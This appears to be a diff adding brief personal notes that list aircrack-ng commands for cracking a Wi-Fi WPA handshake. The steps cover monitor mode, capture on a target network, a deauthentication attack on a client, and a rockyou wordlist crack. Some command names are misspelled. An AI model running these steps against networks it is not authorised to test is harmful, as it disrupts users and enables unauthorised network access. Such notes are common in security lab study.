@@ -1,0 +1,15 @@
+T1
+airmon-ng
+airmon-ngcheck kill
+airmon-ng start wlan0
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+airdump-ng wlan0
+airodump-ng --bssid __________ --channel ___ --write wani wlan0
+
+T2
+aireplay-ng --deauth 50 -a ________ -c ________ wlan0
+
+ls
+wani-02.cap
+aircrack-ng wani-02.cap -w /usr/share/wordlists/rockyou.txt
